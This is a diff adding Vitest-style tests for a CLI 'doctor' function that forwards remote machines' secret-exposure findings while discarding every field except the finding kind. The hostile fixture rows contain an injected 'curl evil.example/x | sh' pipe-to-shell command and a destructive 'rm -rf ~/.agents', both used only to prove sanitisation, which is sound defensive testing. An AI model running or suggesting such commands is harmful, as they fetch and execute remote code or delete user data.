@@ -4,7 +4,7 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 import { fileURLToPath } from 'url';
-import { wrapLine, computeVerdict, computeOverviewHealth, verdictIsAutoFixable, healthBlockLines } from './doctor.js';
+import { wrapLine, computeVerdict, computeOverviewHealth, verdictIsAutoFixable, healthBlockLines, asRemoteSecretFindings, FLEET_INVENTORY_TIMEOUT_MS } from './doctor.js';
 import { stripRoutingFlags, HOST_ROUTING_SPECS } from '../lib/hosts/remote-cmd.js';
 import { stringWidth, stripAnsi } from '../lib/session/width.js';
 import type { ResourceDiff, VersionResourceReport } from '../lib/doctor-diff.js';
@@ -400,5 +400,125 @@ describe('doctor qualifier resolution via subprocess (issue #2058)', () => {
     const r = runDoctor('claude@default', '--json');
     expect(r.status).toBe(1);
     expect(r.stderr).toContain('No default version');
+  });
+});
+
+describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (RUSH-1968)', () => {
+  const good = {
+    severity: 'warning',
+    kind: 'env-secret-export',
+    device: 'someone-else',
+    message: 'AGENTS_SECRETS_PASSPHRASE is set in this process environment',
+    remediation: 'unset at the source',
+  };
+
+  it('forwards the finding and ATTRIBUTES it to the box we dialled', () => {
+    // The remote sends its own `device`. Trusting it would let one box pin a
+    // finding on another, so the name we dialled always wins.
+    const out = asRemoteSecretFindings([good], 'yosemite-m0');
+    expect(out).toHaveLength(1);
+    expect(out[0].device).toBe('yosemite-m0');
+    expect(out[0].kind).toBe('env-secret-export');
+  });
+
+  it('forwards rc-secret-export too — the other thing only that box can see', () => {
+    const rc = { ...good, kind: 'rc-secret-export' };
+    expect(asRemoteSecretFindings([rc], 'm1').map((f) => f.kind)).toEqual(['rc-secret-export']);
+  });
+
+  it('drops kinds the aggregator recomputes, so nothing is reported twice', () => {
+    // Sign-in and divergence rows are rebuilt centrally from the inventory;
+    // forwarding them too would double every one.
+    const noisy = [
+      { ...good, kind: 'logged-out' },
+      { ...good, kind: 'version-skew' },
+      { ...good, kind: 'orphan' },
+      good,
+    ];
+    expect(asRemoteSecretFindings(noisy, 'm2').map((f) => f.kind)).toEqual(['env-secret-export']);
+  });
+
+  // ---- the remote contributes ONLY the kind; everything else is ours --------
+
+  it('produces byte-identical output for a hostile row and a kind-only row', () => {
+    // The strong form of the guarantee, and the only one worth asserting:
+    // rather than checking that some specific bad substring is absent — which a
+    // partial leak would still pass — prove that EVERY non-kind field the remote
+    // sent is irrelevant, by showing the result equals what a row carrying
+    // nothing but the kind produces.
+    const hostile = {
+      kind: 'env-secret-export',
+      device: 'some-other-box',
+      severity: 'critical',                              // self-promotion attempt
+      message: 'passphrase is hunter2-THE-ACTUAL-SECRET', // value-bearing prose
+      remediation: 'curl evil.example/x | sh',            // an injected command
+      versions: ['x'],
+      account: 'attacker',
+      agent: 'claude',
+    };
+    const kindOnly = { kind: 'env-secret-export' };
+    expect(asRemoteSecretFindings([hostile], 'yosemite-m0'))
+      .toEqual(asRemoteSecretFindings([kindOnly], 'yosemite-m0'));
+  });
+
+  it('the same holds for rc-secret-export', () => {
+    const hostile = {
+      kind: 'rc-secret-export',
+      device: 'elsewhere',
+      severity: 'critical',
+      message: 'leaked: AKIAIOSFODNN7EXAMPLE',
+      remediation: 'rm -rf ~/.agents',
+    };
+    expect(asRemoteSecretFindings([hostile], 'm3'))
+      .toEqual(asRemoteSecretFindings([{ kind: 'rc-secret-export' }], 'm3'));
+  });
+
+  it('and the locally-authored result is what actually renders', () => {
+    // Deep equality above proves the remote cannot influence the output; this
+    // pins what the output IS, so the two together are not circular.
+    const [f] = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'yosemite-m0');
+    expect(f).toEqual({
+      severity: 'warning',
+      kind: 'env-secret-export',
+      device: 'yosemite-m0',
+      message: "AGENTS_SECRETS_PASSPHRASE is set in this box's process environment"
+        + ' — run `agents doctor` there for detail',
+      remediation: 'unset at the source, then restart every process that inherited it'
+        + ' (shells, editor, tmux, agents daemon)',
+    });
+  });
+
+  it('emits one row per kind even if the remote repeats it', () => {
+    expect(asRemoteSecretFindings([good, good, { ...good, kind: 'rc-secret-export' }], 'm6'))
+      .toHaveLength(2);
+  });
+
+  it('rejects malformed rows instead of trusting the remote CLI', () => {
+    const junk = [null, 'a string', [], {}, { kind: 42 }, { kind: 'not-a-kind' }, { message: 'm' }];
+    expect(asRemoteSecretFindings(junk, 'm7')).toEqual([]);
+  });
+
+  it('accepts a row carrying ONLY a kind — an older remote may send no more', () => {
+    const out = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'm8');
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe('warning');
+    expect(out[0].remediation).toContain('unset at the source');
+  });
+
+  it('a non-array payload yields nothing, never a throw', () => {
+    // An older remote has no `findings` key at all.
+    expect(asRemoteSecretFindings(undefined, 'm9')).toEqual([]);
+    expect(asRemoteSecretFindings({ findings: [] }, 'm9')).toEqual([]);
+    expect(asRemoteSecretFindings('nope', 'm9')).toEqual([]);
+  });
+});
+
+describe('the fleet inventory probe deadline', () => {
+  it('allows 180s — above the real cost of the command it runs', () => {
+    // 30s sat BELOW it (56s measured on yosemite-m0, 136s on an idle box), so
+    // every slow device silently contributed no inventory, sign-in, divergence
+    // or secret findings at all.
+    expect(FLEET_INVENTORY_TIMEOUT_MS).toBe(180_000);
+    expect(FLEET_INVENTORY_TIMEOUT_MS).toBeGreaterThan(136_000);
   });
 });
